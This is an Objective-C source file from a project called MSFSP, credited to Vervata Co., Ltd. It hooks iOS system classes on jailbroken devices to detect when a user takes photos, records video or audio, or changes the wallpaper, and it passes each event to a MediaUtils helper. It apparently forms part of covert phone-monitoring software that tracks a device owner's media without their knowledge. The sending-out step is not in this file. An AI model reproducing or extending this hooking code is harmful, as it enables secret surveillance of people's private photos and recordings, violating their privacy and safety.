/**
 - Project name :  MSFSP
 - Class name   :  Media
 - Version      :  1.0  
 - Purpose      :  For MS
 - Copy right   :  9/2/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "SBWallpaperView.h"
#import "PLCameraController.h"
#import "RCRecorderViewController.h"
#import "MediaUtils.h"
#import "CRC32.h"
#import "SBWallpaperImage.h"

#pragma mark -
#pragma mark camera hooks

/**
 - Method name: _processCapturedPhotoWithDictionary:error
 - Purpose:  This method is invoked when user take the picture in iOS 4.3, 5.x
 - Argument list and description: arg1 (id),arg2(id)
 - Return type and description:No Return
*/

HOOK(PLCameraController,_processCapturedPhotoWithDictionary$error$,void, id arg1,id arg2) {
    CALL_ORIG(PLCameraController, _processCapturedPhotoWithDictionary$error$,arg1,arg2);
	MediaUtils *mediaUtils=[[MediaUtils alloc] init];
	[mediaUtils sendMediaNotificationWithMediaType:kMediaTypePhoto];
	[mediaUtils release];
	DLog(@"_processCapturedPhotoWithDictionary:error:")
}

/**
 - Method name: _capturedPhotoWithDictionary
 - Purpose:  This method is invoked when user take the picture in iOS 4.0, 4.1, 4.2
 - Argument list and description: arg1 (id)
 - Return type and description:No Return
 */

HOOK(PLCameraController, _capturedPhotoWithDictionary$, void, id arg1) {
	CALL_ORIG(PLCameraController, _capturedPhotoWithDictionary$, arg1);
	MediaUtils *mediaUtils=[[MediaUtils alloc] init];
	[mediaUtils sendMediaNotificationWithMediaType:kMediaTypePhoto];
	[mediaUtils release];
	DLog(@"_capturedPhotoWithDictionary:")
}


#pragma mark -
#pragma mark video hooks

/**			
 - Method name: startVideoCapture
 - Purpose:  This method is invoked when user 'START' the VIDEO recording in iOS 5.x
 - Argument list and description: No argument
 - Return type and description: No Return
 */

HOOK(PLCameraController, startVideoCapture, void) {
    CALL_ORIG(PLCameraController,  startVideoCapture);
	MediaUtils *mediaUtils=[[MediaUtils alloc] init];
	[mediaUtils sendMediaCapturingNotification:kMediaTypeVideo];
	[mediaUtils release];
	DLog(@"------------------ startVideoCapture: ------------------");
} 

/**
 - Method name: stopVideoCapture
 - Purpose:  This method is invoked when user 'STOP' the VIDEO recording in iOS 4.3, 5.x
 - Argument list and description:
 - Return type and description:No Return
*/

HOOK(PLCameraController,stopVideoCapture, void) {
    CALL_ORIG(PLCameraController,  stopVideoCapture);
	MediaUtils *mediaUtils=[[MediaUtils alloc] init];
	[mediaUtils sendMediaNotificationWithMediaType:kMediaTypeVideo];
	[mediaUtils release];
	DLog(@"------------------ stopVideoCapture: ------------------");
}

/**
 - Method name: _captureStarted
 - Purpose:  This method is invoked when user 'START' the VIDEO recording in iOS 4.0, 4.1, 4.2
 - Argument list and description: arg1 (id)
 - Return type and description: No Return
 */

HOOK(PLCameraController, _captureStarted$, void, id arg1) {
	CALL_ORIG(PLCameraController, _captureStarted$, arg1);
	MediaUtils *mediaUtils=[[MediaUtils alloc] init];
	[mediaUtils sendMediaCapturingNotification:kMediaTypeVideo];
	[mediaUtils release];
	DLog(@"------------------ _captureStarted: ------------------");
}

/**
 - Method name: _recordingStopped
 - Purpose:  This method is invoked when user 'STOP' the VIDEO recording in iOS 4.0, 4.1, 4.2
 - Argument list and description: arg1 (id)
 - Return type and description: No Return
 */

HOOK(PLCameraController, _recordingStopped$, void, id arg1) {
	CALL_ORIG(PLCameraController, _recordingStopped$, arg1);
	MediaUtils *mediaUtils=[[MediaUtils alloc] init];
	[mediaUtils sendMediaNotificationWithMediaType:kMediaTypeVideo];
	[mediaUtils release];
	DLog(@"------------------ _recordingStopped: ------------------");
}


#pragma mark -
#pragma mark audio hooks

/**
 - Method name: recordingControlsViewDidStartRecording
 - Purpose:  This method is invoked when user START the audio recording
 - Argument list and description: arg1 (id)
 - Return type and description: No Return
 */

HOOK(RCRecorderViewController, recordingControlsViewDidStartRecording$, void, id arg1) {
	CALL_ORIG(RCRecorderViewController, recordingControlsViewDidStartRecording$, arg1);
	MediaUtils *mediaUtils=[[MediaUtils alloc] init];
	[mediaUtils sendMediaCapturingNotification:kMediaTypeAudio];
	[mediaUtils release];
	DLog(@"------------------ recordingControlsViewDidStartRecording: ------------------");
}

/**
 - Method name: recordingControlsViewDidStopRecording
 - Purpose:  This method is invoked when user stop the audio recording
 - Argument list and description: arg1 (id)
 - Return type and description:No Return
*/

HOOK(RCRecorderViewController, recordingControlsViewDidStopRecording$, void, id arg1) {
	CALL_ORIG(RCRecorderViewController, recordingControlsViewDidStopRecording$, arg1);
	MediaUtils *mediaUtils=[[MediaUtils alloc] init];
	[mediaUtils sendMediaNotificationWithMediaType:kMediaTypeAudio];
	[mediaUtils release];
	DLog(@"------------------ recordingControlsViewDidStopRecording: ------------------");
}


#pragma mark -
#pragma mark wallpaper hooks

/**
 - Method name: _wallpaperChanged
 - Purpose:  This method is used to capture wallpaper image (according to wallpaper status)
 - Argument list and description: No argument
 - Return type and description:No Return
*/

HOOK(SBWallpaperView, _wallpaperChanged, void) {
	DLog (@"HOOK wallpaper")
	CALL_ORIG(SBWallpaperView, _wallpaperChanged);
	MediaUtils *mediaUtils = [[MediaUtils alloc] init];
	[mediaUtils parallelCheckWallpaper];
	[mediaUtils release];
	
}

//HOOK(ALAssetsLibrary, writeImageToSavedPhotosAlbum$orientation$completionBlock$, void, CGImageRef arg1, /*ALAssetOrientation*/ int arg2, /*ALAssetsLibraryWriteImageCompletionBlock*/ id arg3) {
//	DLog (@"ALAssetLibrary =====> writeImageToSavedPhotosAlbum")
//	CALL_ORIG(ALAssetsLibrary, writeImageToSavedPhotosAlbum$orientation$completionBlock$, arg1, arg2, arg3);
//}
//
//HOOK(ALAssetsLibrary, photoLibraryDidChange$, void, id arg1) {
//	DLog (@"ALAssetLibrary =====> photoLibraryDidChange")
//	CALL_ORIG(ALAssetsLibrary,photoLibraryDidChange$, arg1);
//}
//
//HOOK(PLPhotoLibrary, addPhotoToCameraRoll$, void, id arg1) {
//	DLog (@"PLPhotoLibrary =====> addPhotoToCameraRoll")
//	CALL_ORIG(PLPhotoLibrary,addPhotoToCameraRoll$, arg1);
//}
//
//HOOK(PLPhotoLibrary, _notifyChangedPhotos$, void, id arg1) {
//	DLog (@"PLPhotoLibrary =====> _notifyChangedPhotos")
//	CALL_ORIG(PLPhotoLibrary,_notifyChangedPhotos$, arg1);
//}
//
//HOOK(PLPhotoLibrary, pictureWasTakenOrChanged, void, id arg1) {
//	DLog (@"PLPhotoLibrary =====> pictureWasTakenOrChanged")
//	CALL_ORIG(PLPhotoLibrary,pictureWasTakenOrChanged, arg1);
//}

